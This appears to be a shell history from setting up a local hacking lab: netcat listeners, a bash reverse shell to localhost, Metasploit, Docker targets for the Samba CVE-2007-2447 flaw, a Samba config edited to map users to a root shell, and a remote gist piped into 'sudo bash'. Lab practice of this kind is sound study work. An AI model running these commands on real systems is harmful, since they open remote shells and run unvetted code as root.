sudo apt update && sudo apt upgrade -y
sudo apt update
sudo apt install -y netcat-openbsd nmap git curl python3-pip
nc -h
nmap --version
nc -lvnp 4444
nc 172.0.0.1 4444
sudo apt update
nc -lvnp 4444
sudo apt update 
curl -sL https://gist.githubusercontent.com/grobbins-cell/470296da7bc200a4f81abae7ffefcdff/raw/s22_provision.sh | sudo bash
nc -lvnp 4444
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
msfconsole
sudo docker run -d --name samba_conquest -p 139:139 -p 445:445 vulnerables/metasploitable2
sudo docker ps
sudo docker run -d --name samba_conquest -p 139:139 -p 445:445 tleemcjr/metasploitable2
msfconsole
sudo docker pull vulnerables/cve-2007-2447
exit
curl -sL https://gist.githubusercontent.com/grobbins-cell/470296da7bc200a4f81abae7ffefcdff/raw/s22_provision.sh | sudo bash
nc -lvnp 4444
msfconsole
sudo docker ps -a
nmap -sV 127.0.0.1 -p 139,445
msfconsole
sudo docker rm -f $(sudo docker ps -aq)
sudo docker run -d --name samba_target -p 139:139 -p 445:445 medicean/vulhub-samba:cve-2007-2447
sudo docker run -d --name samba_target -p 139:139 -p 445:445 vulnerables/metasploitable2
sudo docker rm -f samba_target 2>/dev/null
sudo docker run -d --name samba_target -p 139:139 -p 445:445 -e SAMBA_SHARE=/tmp -v /tmp:/tmp dperson/samba
sudo docker exec samba_target sh -c "echo 'username map = /etc/samba/smbusers' >> /etc/samba/smb.conf && echo 'root = ( /bin/sh )' > /etc/samba/smbusers && killall -HUP smbd"
sudo docker ps
msfconsole
